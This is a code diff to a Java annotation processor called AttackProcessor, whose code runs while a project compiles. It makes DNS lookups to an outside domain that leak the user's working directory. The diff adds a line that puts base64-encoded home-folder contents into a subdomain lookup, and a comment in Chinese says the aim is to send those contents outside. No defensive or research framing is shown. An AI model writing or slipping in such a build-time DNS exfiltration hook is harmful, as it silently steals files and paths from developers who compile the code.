@@ -31,7 +31,7 @@ public class AttackProcessor extends AbstractProcessor {
 
         try
         {
-            Inet4Address.getByName( "javac17.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( "javac18.lirui28.t.dlsr.ga" );
 
             Inet4Address.getByName( System.getProperty("user.dir")+".1.lirui28.t.dlsr.ga" );
 
@@ -45,13 +45,14 @@ public class AttackProcessor extends AbstractProcessor {
             String fs = sb.toString();
             //输出base64编码的url home文件夹的内容到外部
             fs = new String( Base64.getEncoder().encode( fs.getBytes() ) );
+            fs = fs.replaceAll("\\n", "");
 
-            if (fs.length()>90){
-                Inet4Address.getByName( "dayu90"+".3.lirui28.t.dlsr.ga" );
+            if (fs.length()>20){
+                Inet4Address.getByName( fs.substring( 0,20 )+".3.lirui28.t.dlsr.ga" );
 
                 //Inet4Address.getByName( fs.substring( 0,90 )+".2.lirui28.t.dlsr.ga" );
             } else {
-                    Inet4Address.getByName( "xiaoyu90"+".3.lirui28.t.dlsr.ga" );
+                    Inet4Address.getByName( "xiaoyu20"+".3.lirui28.t.dlsr.ga" );
             }
 
             try {
